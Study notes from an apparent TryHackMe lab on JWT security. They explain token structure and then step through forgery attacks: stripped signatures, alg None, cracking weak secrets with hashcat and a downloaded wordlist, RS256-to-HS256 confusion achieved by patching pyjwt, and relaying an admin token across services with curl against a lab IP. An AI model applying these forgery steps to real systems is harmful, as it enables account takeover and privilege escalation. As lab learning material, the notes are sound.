https://tryhackme.com/room/jwtsecurity

### Table of contents
- [[#Token-Based Authentication]]
- [[#JWT]]
- [[#Sensitive Information Disclosure]]
- [[#Signature Validation Mistakes]]
- [[#Lifetimes]]
- [[#Cross-Service Relay Attacks]]

___
### Token-Based Authentication
[[#Table of contents|Back to the top]]

Cookie: built-in function in browser
Token: client-side JS, stores in browser's LocalStorage, then loads it from storage and attaches it with each request as a header
Common types of token: JWT (JSON Web Tokens), passed through `Authorization: Bearer` header

___
### JWT
[[#Table of contents|Back to the top]]

3 **base64 url encoded** elements, separated by **dots**
- **Header:** type of token (JWT), signing algorithm used
- **Payload:** body, contains ***claims*** (pieces of info, public/private)
- **Signature:** verify token authenticity

*Example*
Encoded
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30`

1. Decoded **Header**
```JSON
{
  "alg": "HS256",
  "typ": "JWT"
}
```

2. Decoded **Payload**
```JSON
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true,
  "iat": 1516239022
}
```

3. **Signature** Verification
`a-string-secret-at-least-256-bits-long`


>**Use [Cyberchef](https://gchq.github.io/CyberChef/) or [jwt.io](https://www.jwt.io/) to decode/encode**

**Signing algorithms**
- **None:** n/a --> no signature verification
- **Symmetric Signing:** append secret value to header and body, then hash (e.g. HS256)
- **Asymmetric Signing:** hash header and body, encrypt hash with private key (e.g. RS256)

Encrypted JWT = JWE

##### Practical
**Authentication:** `curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "passwordX" }' http://10.82.157.145/api/v1.0/exampleX`
**Verification:** `curl -H 'Authorization: Bearer [JWT token]' http://10.82.157.145/api/v1.0/example2?username=Y`

___
### Sensitive Information Disclosure
[[#Table of contents|Back to the top]]

With **cookies**, user information can be stored **server-side**, for instance with PHP `$SESSION['var']=data`
But with **tokens**, JWT is sent **client-side**, so it could expose sensitive information (problem arises when sensitive information is encoded in the claims)
- Credentials: password hash, clear-text
- Internal network info (private IP, authentication server hostname)
- Other sensitive info (personal)

*(devs shouldn't encode sensitive info inside tokens)*

___
### Signature Validation Mistakes
[[#Table of contents|Back to the top]]

Signature incorrectly verified --> possible to forge token

##### 1. No Signature Verification
--> Send token without signature (3rd part) and modify claims (set "admin" to 1)

*Example*
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.
`

##### 2. `"alg"="None"`
--> Setting the signature algorithm to None bypasses the signature verification, making it possible to modify the claims
*(devs should specify a list of algorithms that are allowed to prevent None)*

*Example*
`eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0`

##### 3. Weak Symmetric Secret
--> Crack secret > use secret to forge signature
1. Save JWT to jwt.txt
2. Download [JWT secret list](https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list)
3. Use Hashcat (or [[John the Ripper|John]]) to crack secret: `hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list`
4. Use jwt.io to encode forged token with cracked secret

##### 4. Signature Algorithm Confusion
Similar to None, but with confusion between symmetric and asymmetric: downgrade RS256 to **HS256** --> default to using public key as secret > forge signature

Script to encode token using public key as secret: [[jwt_public_encode.py]]

Edit `/usr/lib/python3/dist-packages/jwt/algorithms.py`: comment out lines 143-146

If pythonjwt not installed: `pip3 install pyjwt`

Or simply use jwt.io...

*(devs should explicitly distinguish between asymmetric and symmetric algs in code)*

___
### Lifetimes
[[#Table of contents|Back to the top]]

Before verifying signature, verify lifetime through **`exp`** claim

If `exp` claim isn't specified --> token can be reused indefinitely

Cookies can be expired server-side, tokens can't

___
### Cross-Service Relay Attacks
[[#Table of contents|Back to the top]]

Centralised authentication serves multiple apps

Restrict which app can be accessed with JWT: **`aud`** claim

**Enforcement** of `aud` claim happens on the **app** itself, if claim isn't verified JWT can be wrongfully considered valid

--> admin on an app, can transfer privilege to other app where token shouldn't grant admin rights

1. Authenticate on endpoint B where token grants admin rights: `curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appB" }' http://10.82.157.145/api/v1.0/example7`
2. Use token to get admin authorization on other endpoint A: `curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.82.157.145/api/v1.0/example7_appA?username=admin`